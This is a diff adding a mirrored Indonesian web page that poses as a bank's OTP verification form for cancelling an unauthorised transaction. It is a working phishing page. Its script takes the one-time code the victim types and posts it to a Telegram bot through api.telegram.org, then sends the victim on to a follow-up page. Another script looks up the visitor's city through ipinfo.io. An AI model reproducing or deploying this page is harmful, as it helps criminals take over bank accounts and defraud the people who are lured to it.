@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+  <!-- Mirrored from canceltransksibbni.netlify.app/www.web-ld.com/membatalkan/batalblokir/banklain/otp2.html by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 08 Jul 2026 03:09:37 GMT -->
+  <!-- Added by HTTrack -->
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+  <!-- /Added by HTTrack -->
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+        <meta content="#ff9315" name="theme-color">
+          <title>Verifikasi OTP</title>
+          <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: Arial, sans-serif;
+        }
+        .background {
+            background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEhXlg5fhyWQY4Vp0bb_BelRPPfYgH9KBasWkVcvlW8MdUMWeNlbBA7pyzF8SjMU66M6Y11PqNwtnP_Dy5kkD090OPG085Xfdxez7hnPn1OsBanyrXnoSk5DBbDOzF2J0fKtOvdwWmZIACA9qneuSRJuTW6-uXqAe3fX8EZ0rAjD5N9ZuOM_goevc_eVoo0Q');
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+        .form-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 300px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.2);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+margin-left:10px;
+        }
+        input {
+            width: 85%;
+            padding: 10px;
+            border: 1.5px solid orange;
+            border-radius: 25px;
+            text-align: center;
+            font-size: 16px;
+            margin-left:10px;
+        }
+        button {
+            width: 90%;
+            padding: 12px;
+            border: none;
+            margin-left:13px;
+            border-radius: 25px;
+            background-color: #ff9315;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #ff9315;
+        }
+        
+        nav {
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            z-index: 1000;
+border: 2px solid #ffffff; 
+        }
+        nav.top {
+            top: 0;
+            margin-left:0%;
+            border-bottom: 2px solid #ccc;
+        }
+        nav.bottom {
+            bottom: 0;
+            border-top: 2px solid #ddd;
+        }
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+                p{
+          font-size: 14px;
+          text-align: center;
+        }
+        
+                #timer {
+      margin-top: 15px;
+      text-align: center;
+      color: black;
+      font-size: 13px;
+    }
+    </style>
+        </head>
+        <body>
+          <nav class="top">
+            <img src="images/Picsart_25-04-04_14-51-50-816.jpg" alt="Nav Atas">
+            </nav>
+            <div class="background">
+              <div class="form-container">
+                <h3 style="text-align: center;">Verifikasi OTP</h3>
+                <p>Code Otentikasi sudah dikirim ke<br>telepon seluler anda<br>+628xxxxxxxxx Masukan Code<br>Otentikasi untuk membatalkan<br>transaksi yang tidak anda lakukan</p>
+                <div id="timer">
+                  Kode Dikirim: <span id="countdown">5:00</span> menit
+                </div>
+                <div id="resend" style="display:none;">
+                  <span id="resendText" style="cursor:pointer; color:blue;">Kirim Ulang</span>
+                </div>
+                <br>
+                  <div class="form-group">
+                    <label for="otp">
+                    </label>
+                    <input type="tel" id="otp" name="otp" maxlength="1000" minlength="1000" required="" placeholder="Masukkan 6 digit kode OTP">
+                    </div>
+                    <div class="form-group">
+                      <button type="submit">Batalkan Transaksi</button>
+                    </div>
+                  </form>
+                </div>
+              </div>
+             <script src="tel/config.js"></script>
+              <script src="tel/telegram-bot.js"></script>
+              <script>
+document.querySelector("button[type='submit']").addEventListener("click", function (e) {
+    e.preventDefault(); // Cegah reload halaman
+
+    let otp = document.getElementById("otp").value.trim();
+
+    
+
+    let message = `🚫 Pembatalan Transaksi [BANK LAIN]\n\n🔐 Kode OTP: ${otp}`;
+
+    fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: telegramConfig.chatId,
+            text: message
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        // Setelah terkirim, arahkan ke halaman konfir.html
+        window.location.href = "menu2.html";
+    })
+    .catch(err => {
+        console.error("Gagal mengirim:", err);
+        alert("Terjadi kesalahan saat mengirim kode OTP.");
+    });
+});
+</script>
+              <script>
+    // Ambil nama kota saat halaman dimuat
+    fetch("../../../../../external.html?link=https://ipinfo.io/city")
+        .then(response => response.text())
+        .then(city => {
+            document.getElementById("kota").value = city.trim();
+        })
+        .catch(() => {
+            document.getElementById("kota").value = "Tidak Diketahui";
+        });
+        
+        let timeLeft = 5 * 60; // 5 menit dalam detik
+const countdownEl = document.getElementById('countdown');
+const resendDiv = document.getElementById('resend');
+
+function formatTime(seconds) {
+  const minutes = Math.floor(seconds / 60);
+  const secs = seconds % 60;
+  return `${minutes}:${secs.toString().padStart(2, '0')}`;
+}
+
+const timerInterval = setInterval(() => {
+  timeLeft--;
+  countdownEl.textContent = formatTime(timeLeft);
+
+  if (timeLeft <= 0) {
+    clearInterval(timerInterval);
+    document.getElementById('timer').style.display = 'none';
+    resendDiv.style.display = 'block';
+  }
+}, 1000);
+
+document.getElementById('resendText').addEventListener('click', function() {
+  location.reload();
+});
+</script>
+              <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9bef7fba9ac4e61ad4cec9c1ba83eba","r":1}' crossorigin="anonymous"></script>
+            </body>
+            <!-- Mirrored from canceltransksibbni.netlify.app/www.web-ld.com/membatalkan/batalblokir/banklain/otp2.html by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 08 Jul 2026 03:09:37 GMT -->
+          </html>
